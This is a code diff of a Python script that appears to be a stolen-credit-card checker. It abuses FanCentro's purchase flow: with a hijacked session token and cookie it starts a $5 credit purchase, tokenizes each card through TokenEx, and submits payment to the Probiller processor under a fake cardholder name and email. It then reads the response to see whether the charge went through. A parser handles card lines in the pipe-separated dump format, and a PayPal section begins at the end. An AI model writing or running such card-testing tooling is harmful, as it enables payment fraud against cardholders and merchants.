@@ -124,14 +124,11 @@ def fan_refresh_token():
     p = {"withCredentials": True, "isRefreshToken": True}
     try:
         r = requests.post("https://fancentro.com/api/v1/api/refreshToken", json=p, headers=h, timeout=30)
-        print(f"[FAN] Refresh Status: {r.status_code}")
-        print(f"[FAN] Refresh Body: {r.text[:300]}")
         if r.status_code == 200:
             data = r.json()
             for key in ['token', 'jwt', 'access_token', 'refreshToken', 'accessToken']:
                 if key in data and data[key]:
                     FAN_TOKEN = data[key]
-                    print(f"[FAN] New Token: {FAN_TOKEN[:50]}...")
                     return True
             auth = r.headers.get('authorization', '')
             if auth:
@@ -141,12 +138,13 @@ def fan_refresh_token():
             if match:
                 FAN_TOKEN = match.group(0)
                 return True
-    except Exception as e:
-        print(f"[FAN] Refresh Error: {e}")
+    except:
+        pass
     return False
-    
+
 def fan_headers():
     return {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/chat', 'user-agent': 'Mozilla/5.0'}
+
 def fan_init():
     p = {"creditAmount":500,"displayAmount":"5","displayAmountFormatted":"5,00 $","priceAmountUsd":5,"taxDisclaimer":"","billingDisclaimer":"One time charge of 5,00 $. Will not rebill.","amount":5,"taxAmount":0,"totalAmount":5,"taxDisplayType":1,"taxApplicationId":"","taxRate":0,"taxName":"","productSku":FAN_SKU,"freeCreditsAmount":0,"freeCreditsPercent":0,"currency":"USD","currencySymbol":"$","creditAmountTotal":500,"paymentType":"cc","paymentMethod":"cc","displayName":"CREDIT CARD","type":"credit","baseAmount":5,"freeCreditAmount":0,"price":"5"}
     r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
@@ -154,27 +152,38 @@ def fan_init():
         fan_refresh_token()
         r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
     if r.status_code != 200:
-        return f"STATUS:{r.status_code} BODY:{r.text[:150]}"
+        return f"STATUS:{r.status_code}"
     data = r.json()
     mgpg = data.get('mgpgResponse')
     if not mgpg:
-        return f"NO_MGPG: {json.dumps(data)[:150]}"
+        return "NO_MGPG"
     pr = mgpg.get('nextAction', {}).get('extensions', {}).get('proxySettings', {}).get('settings', {})
     return {'sid': mgpg.get('sessionId'), 'cid': mgpg.get('correlationId'), 'jwt': mgpg.get('jwtToken'), 'vurl': data.get('validationUrl'), 'akey': pr.get('authenticationKey'), 'ts': pr.get('timestamp'), 'tid': pr.get('identifier', '4023327228985313')}
+
+def fan_tokenize(s, card, cvv):
+    p = {"TokenExID":s['tid'],"Origin":"https://fancentro.com","AuthenticationKey":s['akey'],"Timestamp":s['ts'],"Data":card,"CvvValue":cvv,"TokenScheme":"PCI","CvvOnly":"False","PCI":"True","ReturnHash":None,"use3DS":"False","EnforceLuhnCompliance":"true","CustomDataLuhnCheck":True}
+    h = {'content-type':'application/json','origin':'https://htp.tokenex.com','referer':'https://htp.tokenex.com/iframe/v3','user-agent':'Mozilla/5.0'}
+    r = requests.post("https://htp.tokenex.com/iframe/v3", json=p, headers=h, timeout=30)
+    if r.status_code != 200:
+        return None
+    return r.json().get('token', '')
+
+def fan_pay(s, token, cvv, em, ey):
+    h = {'Content-Type':'application/json','x-auth-token':s['jwt'],'x-session-id':s['sid'],'x-correlation-id':s['cid'],'Origin':'https://fancentro.com','Referer':'https://fancentro.com/','User-Agent':'Mozilla/5.0'}
+    p = {"sessionId":s['sid'],"correlationId":s['cid'],"payment":{"paymentInformation":{"cardInformation":{"ccNumber":token,"cvv":cvv,"cardExpirationMonth":em,"cardExpirationYear":ey,"cardHolderInfo":{"firstName":"wafa","lastName":"bro","email":"Iadiitiomjs@gmail.com","countryCode":"US","zipCode":"10001"}}},"validationUrl":s['vurl']}}
+    return requests.post("https://mgpg2.probiller.com/api/process", json=p, headers=h, timeout=30)
 
 def fan_check_card(card, cvv, em, ey):
     fan_refresh_token()
     s = fan_init()
     if isinstance(s, str):
         return f"ERROR: {s}"
-    if not s:
-        return "ERROR: Init failed"
     t = fan_tokenize(s, card, cvv)
     if not t:
         return "ERROR: TokenEx failed"
     r = fan_pay(s, t, cvv, em, ey)
     if r.status_code != 200:
-        return f"ERROR {r.status_code}: {r.text[:100]}"
+        return f"ERROR {r.status_code}"
     d = r.json()
     charges = d.get('invoice', {}).get('charges', [])
     if charges:
@@ -191,13 +200,15 @@ def fan_check_card(card, cvv, em, ey):
 
 def fan_parse_line(line):
     line = line.strip()
+    parts = None
     for sep in ['|',',',':',';','\t']:
         if sep in line:
             parts = [p.strip() for p in line.split(sep) if p.strip()]
             break
-    else:
+    if parts is None:
         parts = line.split()
-    if len(parts) < 4: return None
+    if len(parts) < 4:
+        return None
     return parts[0], parts[3], parts[1].zfill(2), "20"+parts[2] if len(parts[2])==2 else parts[2]
     # ==================== PayPal ====================
 class PayPalCommerce:
